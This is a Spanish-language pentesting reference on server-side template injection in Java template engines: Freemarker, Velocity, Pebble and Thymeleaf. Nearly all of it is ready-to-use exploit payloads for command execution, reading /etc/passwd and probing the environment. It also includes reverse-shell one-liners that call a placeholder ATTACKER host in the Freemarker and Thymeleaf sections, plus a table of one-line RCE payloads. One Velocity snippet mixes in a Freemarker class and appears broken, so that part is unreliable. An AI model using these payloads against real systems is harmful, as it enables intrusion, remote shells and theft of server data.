# Motores Java (Freemarker, Velocity, Pebble, Thymeleaf)

Los motores de plantillas Java son más restrictivos que los de Python/PHP porque la JVM tiene un modelo de seguridad más estricto. Sin embargo, todos permiten RCE si el código de plantilla puede instanciar clases o ejecutar métodos de Java.

### Freemarker

#### Contexto

Freemarker se usa en Apache, Spring MVC (como alternativa a Thymeleaf), aplicaciones J2EE legacy y herramientas como Confluence, JIRA (versiones antiguas), y Adobe ColdFusion. También lo usa Alfresco.

```java
// Código vulnerable (Spring MVC)
@GetMapping("/greet")
public String greet(@RequestParam String name, Model model) {
    model.addAttribute("name", name);
    return name;  // ← devuelve el nombre como nombre de vista, no como variable
    // Si name es una plantilla, Freemarker la procesa directamente
}
```

#### Confirmación Freemarker

```
${7*7}          → 49
#{7*7}          → 49  (formato numérico)
${.version}     → 2.3.x  (versión de Freemarker)
${.template_name} → nombre del template actual
${"freemarker.template.utility.Execute"?new()?class}  → confirma instanciación
```

#### Freemarker — Escalada a RCE

**Método 1 — `freemarker.template.utility.Execute` (el más clásico)**

```java
// Execute es una clase de Freemarker que llama a Runtime.exec()
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
${ex("whoami")}
${ex("cat /etc/passwd")}

// Reverse shell
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("bash -c 'bash -i >& /dev/tcp/ATTACKER/9001 0>&1'")}
```

**Método 2 — `freemarker.template.utility.JythonRuntime` (si Jython está instalado)**

```java
<#assign ob="freemarker.template.utility.JythonRuntime"?new()>
<@ob>import os;os.system("id")</@ob>
```

**Método 3 — Via `ObjectConstructor` + `ProcessBuilder`**

```java
// Instanciar ProcessBuilder para ejecución de comandos
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
<#assign br=ob("java.io.BufferedReader",
    ob("java.io.InputStreamReader",
        ob("java.lang.ProcessBuilder",["id"]).start().getInputStream()))>
<#list 0..99999 as _>
    <#assign line=br.readLine()!>
    <#if line?has_content>${line}<br></#if>
</#list>

// Con múltiples argumentos (comando con argumentos)
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
<#assign pb=ob("java.lang.ProcessBuilder",["bash","-c","id"])>
<#assign process=pb.start()>
<#assign is=process.getInputStream()>
<#assign reader=ob("java.io.InputStreamReader",is)>
<#assign br=ob("java.io.BufferedReader",reader)>
${br.readLine()}
```

**Método 4 — Via `Runtime.exec()` directamente**

```java
// Acceder a Runtime a través de la jerarquía de clases
${"freemarker.template.utility.Execute"?new()("id")}

// Via ?api (si está habilitado en la configuración)
${object?api.class.forName("java.lang.Runtime").getMethod("exec","".class).invoke(
    object?api.class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),
    "id"
)}
```

#### Freemarker — Leer archivos

```java
// Via Execute
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("cat /etc/passwd")}

// Via FileReader (más directo)
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
<#assign fr=ob("java.io.FileReader","/etc/passwd")>
<#assign br=ob("java.io.BufferedReader",fr)>
<#list 0..99999 as _>
    <#assign line=br.readLine()!>
    <#if line?has_content>${line}<br></#if>
</#list>
```

#### Freemarker — Reconocimiento del entorno

```java
// Variables del contexto del template
${.data_model?keys}             // Variables disponibles
${.globals?keys}                // Globales de Freemarker
${.version}                     // Versión
${.template_name}               // Nombre del template
${.locale}                      // Locale del servidor

// Si hay objeto request (Spring):
${Request}
${RequestParameters}
${Session}
${Application}

// Variables de entorno Java
${"java.lang.System"?new()}     // Intentar instanciar System
```

### Velocity

Apache Velocity es un motor de plantillas Java más antiguo que Freemarker. Se usa en aplicaciones J2EE legacy, Apache Turbine, herramientas de generación de código y algunos frameworks de email. Todavía presente en sistemas bancarios y empresariales.

```java
// Código vulnerable
VelocityEngine ve = new VelocityEngine();
Template t = ve.getTemplate(userInput);  // Si userInput es la plantilla completa
```

#### Confirmación Velocity

```
${7*7}              → 49
#set($x=7)${x*7}    → 49
$class              → objeto ClassTool si está disponible
$text               → objeto TextTool si está disponible
```

#### Velocity — Escalada a RCE

Velocity usa `$variable` y `#directiva`. Los objetos disponibles dependen del contexto configurado, pero casi siempre se puede llegar a `Runtime` a través de la reflexión.

**Método 1 — Via ClassTool o ClassInfo (si disponibles)**

```java
// Si ClassTool o ClassInfo están en el contexto:
#set($rt = $class.forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null))
#set($exec = $rt.exec("id"))
#set($is = $exec.getInputStream())
#set($reader = $class.forName("java.io.InputStreamReader").getDeclaredConstructors()[0].newInstance([$is]))
#set($buffer = $class.forName("java.io.BufferedReader").getDeclaredConstructors()[0].newInstance([$reader]))
${buffer.readLine()}
```

**Método 2 — Via variable del contexto que sea un objeto Java**

```java
// Si hay cualquier objeto Java en el contexto (por ejemplo $request)
// se puede usar para navegar la jerarquía

#set($loader = $request.class.classLoader)
#set($rt = $loader.loadClass("java.lang.Runtime").getMethod("getRuntime").invoke(null))
#set($exec = $rt.exec("id"))
```

**Método 3 — Via #evaluate (Velocity 1.6+)**

```java
// #evaluate permite evaluar código Velocity dinámicamente
#set($s = "#set(\$e = \"")
#set($s = $s + "freemarker.template.utility.Execute")
#evaluate($s)
```

**Método 4 — Via herramientas de Velocity Tools**

```java
// Si VelocityTools está configurado
$response.setContentType("text/html")
$response.getWriter().println($runtime.exec("id").text)
```

#### Velocity — Sintaxis de referencia

```java
// Variables
#set($var = "valor")
${var}

// Condicionales
#if($condition)
    código
#end

// Bucles
#foreach($item in $lista)
    ${item}
#end

// Acceso a objetos Java
$objeto.metodo()
$objeto.propiedad
${objeto.metodo("argumento")}
```

### Pebble

Pebble es un motor de plantillas Java moderno inspirado en Jinja2. Se usa como alternativa a Thymeleaf en algunos proyectos **Spring Boot** y aplicaciones Java independientes. Usa `{{ }}` y `{% %}` igual que Jinja2/Twig.

#### Confirmación Pebble

```
{{7*7}}         → 49
{{"test"}}      → test
{{true}}        → true
```

#### Pebble — Escalada a RCE

Pebble tiene acceso a la reflexión de Java. La técnica usa los constructores de clases para instanciar `ProcessBuilder` o `Runtime`.

```java
// Via forName y getMethod
{%set classname = "java.lang.Runtime" %}
{%set rtc = classname|upper|replace("JAVA.LANG.RUNTIME","java.lang.Runtime") %}
{%set a = "".class.forName(rtc) %}
{%set b = a.getMethod("exec","".class) %}
{%set c = a.getMethod("getRuntime") %}
{%set d = c.invoke(a) %}
{%set e = b.invoke(d,"id") %}
{{e}}

// Versión más directa (Pebble sin sandbox):
{%for i in "".__class__.forName("java.lang.Runtime").getMethod("exec","".class).invoke("".class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id").inputStream.readAllBytes()%}
{{i}}
{%endfor%}

// Via ProcessBuilder (más controlado):
{%set rt = "".class.forName("java.lang.ProcessBuilder") %}
{%set constructor = rt.getDeclaredConstructors()[0] %}
{%set pb = constructor.newInstance([["id"]]) %}
{%set process = pb.start() %}
{%set is = process.getInputStream() %}
{%set reader = "".class.forName("java.io.InputStreamReader").getDeclaredConstructors()[0].newInstance([is]) %}
{%set br = "".class.forName("java.io.BufferedReader").getDeclaredConstructors()[0].newInstance([reader]) %}
{{br.readLine()}}
```

### Thymeleaf

#### Contexto

Thymeleaf es el motor de plantillas **por defecto en Spring Boot**. Es extremadamente común en aplicaciones Java empresariales modernas. Usa atributos HTML especiales (`th:`) en lugar de delimitadores de texto, aunque también tiene expresiones SpEL (`${...}`, `*{...}`).

#### Confirmación Thymeleaf

```
# Las expresiones de Thymeleaf se evalúan en atributos th:
<p th:text="${7*7}">   → 49

# En Spring Expression Language (SpEL):
*{7*7}                 → 49
${7*7}                 → 49

# Fuera de atributos th: (si hay rendering inseguro):
[[${7*7}]]             → 49   (inline expressions)
[(${7*7})]             → 49   (inline unescaped)
```

#### Thymeleaf — Escalada a RCE

Thymeleaf usa SpEL (Spring Expression Language) que tiene acceso a la JVM completa.

```java
// Via SpEL — acceso a Runtime
${T(java.lang.Runtime).getRuntime().exec('id')}
${T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','id'})}

// Via T() operator de SpEL
*{T(java.lang.Runtime).getRuntime().exec('id')}
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.String).valueOf(new char[]{105,100})).getInputStream())}

// Capturar el output (Runtime.exec() no devuelve output directamente)
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}

// Via ProcessBuilder
${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}
${new java.util.Scanner(new java.lang.ProcessBuilder('id').start().getInputStream()).next()}

// Reverse shell
${T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/bash','-c','bash -i >& /dev/tcp/ATTACKER/9001 0>&1'})}

// Inline expressions en Thymeleaf (sin atributos th:)
[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
[(${T(java.lang.Runtime).getRuntime().exec('id')})]
```

### Tabla comparativa — Java engines

| Motor          | Confirmación     | Payload RCE                                                           |
| -------------- | ---------------- | --------------------------------------------------------------------- |
| **Freemarker** | `${.version}`    | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| **Velocity**   | `#set($x=7)${x}` | Via `$class.forName("java.lang.Runtime")...`                          |
| **Pebble**     | `{{7*7}}` → 49   | Via `"".class.forName("java.lang.ProcessBuilder")...`                 |
| **Thymeleaf**  | `*{7*7}` → 49    | `${T(java.lang.Runtime).getRuntime().exec('id')}`                     |

### Dificultad para capturar output en Java

En Java, `Runtime.exec()` no devuelve el output directamente. Hay que leer el `InputStream`:

```java
// Patrón genérico para capturar output de Runtime.exec() en cualquier motor Java

// 1. Ejecutar el comando
Process p = Runtime.getRuntime().exec("id");

// 2. Leer el InputStream
InputStream is = p.getInputStream();
InputStreamReader isr = new InputStreamReader(is);
BufferedReader br = new BufferedReader(isr);
String line = br.readLine();
// → line contiene el output del comando

// En Freemarker:
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
<#assign proc=ob("java.lang.ProcessBuilder",["id"]).start()>
<#assign is=proc.getInputStream()>
<#assign br=ob("java.io.BufferedReader",ob("java.io.InputStreamReader",is))>
${br.readLine()}

// En Thymeleaf (con IOUtils de Apache Commons):
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
// Si IOUtils no está disponible:
${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}
```

> Freemarker con `Execute?new()` es el payload Java más conocido y el más fácil de recordar — una sola línea da RCE directo si la clase `Execute` no está en la blacklist.

> Thymeleaf en Spring Boot es actualmente el motor Java más frecuente en aplicaciones modernas. El operador `T()` de SpEL es potentísimo porque da acceso directo a cualquier clase Java.

> En entornos con SecurityManager de Java activo, la instanciación de `Runtime` puede estar bloqueada. En ese caso, buscar gadgets en las librerías disponibles (Commons Collections, Spring, etc.) para RCE alternativo.
